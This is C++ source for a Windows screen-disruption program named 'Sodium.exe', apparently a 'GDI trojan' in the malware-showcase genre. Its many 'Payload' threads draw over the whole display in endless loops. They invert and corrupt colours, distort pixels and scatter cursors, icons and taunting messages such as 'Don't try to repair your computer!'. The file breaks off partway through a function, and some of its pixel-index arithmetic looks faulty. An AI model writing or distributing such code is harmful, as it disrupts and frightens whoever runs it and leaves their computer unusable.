#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include <time.h>
#include "Sodium_GDIConfig.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#define RGBBRUSH (DWORD)0x1900ac010e

BOOL RefreshScreen() {
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    InvalidateRect(0, 0, 0);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    return true;
}

DWORD WINAPI DrawCursors(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc;
    HICON shifang;
    while (true) {
        HICON shifang = LoadCursor(0, IDC_APPSTARTING);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_ARROW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_CROSS);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_HELP);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_IBEAM);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_NO);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZEALL);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENESW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENS);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENWSE);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZEWE);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_UPARROW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_WAIT);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
    }
}

DWORD WINAPI DrawIcons(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (true) {
        HICON shifang = LoadIcon(NULL, MAKEINTRESOURCE(32512 + rand() % 4));
        HDC hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
    }
}

DWORD WINAPI DrawTexts(LPVOID lpParam) {
    LPCSTR text[11] = { "Sodium.exe", "Coder-Linjian", "Element 11", "Don't try to repair your computer!", "HAHAHAHA!", "Do you like this feeling?", "You can't do anything about it!" , "Just give up, There's no hope!", "What were you thinking?", "It's all your fault!", "Still using this computer?" };
    while (true) {
        DWORD bItalic = 1 - rand() % 2;
        DWORD bUnderline = 1 - rand() % 2;
        DWORD bStrikeOut = 1 - rand() % 2;

        int rdx = 1 + rand() % 5; int xxx = (rdx * 10) - 10;
        int cWidth = 70 - xxx;
        int cHeight = 80 - xxx;
        int randnum = 1 + rand() % 10;
        LPCSTR pszFaceName = NULL;
        if (randnum == 1) {
            pszFaceName = "Marlett";
        }
        else if (randnum == 2) {
            pszFaceName = "MS Sans Serif";
        }
        else if (randnum == 3) {
            pszFaceName = "Terminal";
        }
        else if (randnum == 4) {
            pszFaceName = "System";
        }
        else if (randnum == 5) {
            pszFaceName = "Courier New";
        }
        else if (randnum == 6) {
            pszFaceName = "Comic Sans MS";
        }
        else if (randnum == 7) {
            pszFaceName = "Tahoma";
        }
        else if (randnum == 8) {
            pszFaceName = "Segoe UI";
        }
        else if (randnum == 9) {
            pszFaceName = "Wingdings";
        }
        int tmp = rand() % 11;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL);
        SetBkMode(hdc, 1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(cHeight, cWidth, 0, 0, FW_NORMAL, bItalic, bUnderline, bStrikeOut, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, pszFaceName);
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
        ReleaseDC(NULL, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(10);
    }
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI Payload1_num1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        BLENDFUNCTION blur;
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
        SelectObject(hcdc, hBitmap);
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 10;
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload1_num2(LPVOID lpParam) {
    BLENDFUNCTION blur;
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 25) {
            for (int x = 0; x < w; x += 25) {
                StretchBlt(hcdc, x, y, 25, 25, hcdc, x, y, 20, 20, SRCCOPY);
            }
        }
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 100;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
    }
}

DWORD WINAPI Payload1_num3(LPVOID lpParam) {
    INT i = 0;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                FLOAT fx = (x ^ i * 8) ^ (y + i * 4);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx + x / 50.f + y / h * .1f, 0.9f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload2_num1(LPVOID lpParam) {
    float colorShift = 114.5;
    float colorIntensity = 0.14;
    while (1)
    {
        INT i = 0;
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int Xii = x * i & i;
                int Yii = i * y - i;
                int fx = (int)((i ^ 3) + (i * 6) * sin((Xii + i) * (Yii - i)));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(h) * colorIntensity, 1.0f);
                hslcolor.s = fmod(hslcolor.s + (x % 5) / 10.0f, 2.0f);
                hslcolor.l = fmod(hslcolor.l + (y % 5) / 5.0f, 3.0f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload2_num2(LPVOID lpParam) {
    while (1)
    {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBRUSH hBrush = CreateHatchBrush(rand() % 7, Hue(245));
        SelectObject(hdc, hBrush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        ReleaseDC(0, hdc);
        DeleteObject(hBrush);
        Sleep(1);
    }
}

DWORD WINAPI Payload3_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, 4 * h * w, data);
        BYTE byte = rand() % 0xff;
        int  v = 1 + rand() % 49;
        for (int i = 0; w * h > i; i++) {
            INT x = i % w, y = i * h;
            ((BYTE*)(data + i + v))[v] += i & (x * y);
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload4_num1(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                FLOAT fx = ((x)+(i + i * 80));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .1000f, 1.f);
                hslcolor.s = 0.99f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 65;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload4_num2(LPVOID lpParam) {
    int get = 2;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int bei = rand() % 2;

            if (bei == 1) {
                StretchBlt(hcdc, get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
            }
            else {
                StretchBlt(hcdc, -get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
            }
        }
        hdc = GetDC(0);
        HDC hcdc1 = CreateCompatibleDC(hdc);
        HBITMAP hBitmap1 = CreateCompatibleBitmap(hcdc, w, h);
        SelectObject(hcdc1, hBitmap1);
        BitBlt(hcdc1, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            int bei2 = rand() % 2;

            if (bei2 == 1) {
                StretchBlt(hcdc1, x, get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
            }
            else {
                StretchBlt(hcdc1, x, -get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
            }
        }

        BitBlt(hdc, 0, 0, w, h, hcdc1, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteDC(hcdc1);
        DeleteObject(hcdc);
        DeleteObject(hcdc1);
        DeleteObject(hBitmap);
        DeleteObject(hBitmap1);
        Sleep(150);
    }
    return 0;
}

DWORD WINAPI Payload5_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    INT i = 0;

    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = x * h + y;
                FLOAT fx = (y + i * 6) ^ (x);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 220.f + y / h * .5f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload5_num2(LPVOID lpParam) {
    srand(time(NULL));
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload5_num3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int size = 500; int rop = NULL;
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            int luckynum = 1 + rand() % 9;
            if (luckynum > 5) {
                rop = SRCERASE;
            }
            else {
                rop = SRCPAINT;
            }
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, rop);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload6_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pBits = nullptr;

    srand(time(NULL));

    while (true) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x ^ y * w;

                BYTE originalRed = pBits[index].rgbRed;
                BYTE originalGreen = pBits[index].rgbGreen;
                BYTE originalBlue = pBits[index].rgbBlue;

                BYTE fractalRed = (x ^ y) * 9;
                BYTE fractalGreen = (x ^ y) * 9;
                BYTE fractalBlue = x ^ y ^ 9;

                pBits[index].rgbRed = static_cast<BYTE>(0.5 * originalRed + 0.5 * fractalRed);
                pBits[index].rgbGreen = static_cast<BYTE>(0.5 * originalGreen + 0.5 * fractalGreen);
                pBits[index].rgbBlue = static_cast<BYTE>(0.5 * originalBlue + 0.5 * fractalBlue);

                pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.8);
                pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.8));
                pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.8);

                pBits[index].rgbRed = static_cast<BYTE>(0.3 * fractalBlue + 0.6 * fractalGreen);
                pBits[index].rgbGreen = static_cast<BYTE>(0.3 * fractalRed + 0.6 * fractalBlue);
                pBits[index].rgbBlue = static_cast<BYTE>(0.3 * fractalGreen + 0.6 * fractalRed);
            }
        }
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload6_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, 0, -1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        HBRUSH hBrush = CreateSolidBrush(Hue(239));
        SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteObject(hBrush);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload7_num1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        BITMAPINFO bmpi = { 0 };
        BLENDFUNCTION blur;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 20;
        StretchBlt(hcdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, w, h, SRCINVERT);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload7_num2(LPVOID lpParam) {
    for (;;) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 3) & i * 2;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload8_num1(LPVOID lpParam) {
    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y ^ x * h;

                int fx = (int)((i ^ 4) + ((4 - i)) + (i * 9) + ((i * 3))) * cbrt(y);

                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCERASE);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload8_num2(LPVOID lpParam) {
    for (;;) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int y = 0; y < h; y += 100) {
            for (int x = 0; x < w; x += 100) {
                StretchBlt(hcdc, x, y, 100, 100, hcdc, x, y, 105, 105, SRCCOPY);
            }
        }

        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
